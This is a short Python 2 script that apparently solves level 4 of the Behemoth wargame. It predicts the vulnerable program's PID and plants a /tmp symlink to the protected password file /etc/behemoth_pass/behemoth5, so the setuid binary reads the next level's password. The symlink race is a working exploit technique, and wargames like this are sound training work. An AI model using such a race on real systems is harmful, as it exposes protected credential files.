import subprocess
import time
import os
from multiprocessing import Process, Value

def probe(n):
    prc = subprocess.Popen('/behemoth/behemoth4',shell=False)
    print prc.pid
    n.value = prc.pid



if __name__ == '__main__':

    PID = Value('i', 0)
    p = Process(target=probe, args=(PID,))
    p2 = Process(target=probe,args=(PID,))
    p3 = Process(target=probe,args=(PID,))
    p4 = Process(target=probe,args=(PID,))
    p5 = Process(target=probe,args=(PID,))
    probe(PID)
    
    time.sleep(0.01)
    print "obtained value to be " + str(PID.value)
    staticV = PID.value

    p.start()
    p2.start()
    p3.start()
    p4.start()
    p5.start()
    
    prc2 = subprocess.Popen('ln -s /etc/behemoth_pass/behemoth5 /tmp/' + str(staticV+10), shell=True)
    
    
    print "created the link at " + str(staticV+10)
    time.sleep(1)
    os.remove('/tmp/' + str(staticV+10))
